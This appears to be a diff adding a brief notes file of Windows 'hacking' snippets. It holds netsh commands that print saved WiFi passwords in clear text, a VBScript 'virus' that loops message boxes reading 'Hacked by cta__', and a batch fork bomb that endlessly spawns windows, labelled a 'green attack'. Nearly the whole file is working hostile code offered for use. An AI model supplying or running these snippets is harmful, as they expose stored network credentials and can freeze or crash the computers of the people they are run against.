@@ -1,0 +1,18 @@
+WIFI
+
+netsh wlan show profiles - Check the Names
+netsh wlan show profile name="WiFi-NAME" key=clear
+
+.vbs normal viruses
+
+do
+msgbox("Hacked by cta__")
+loop
+
+ctrl + Shift + Esc for end task
+
+.bat green attack
+
+:loopstart
+start
+goto loopstart
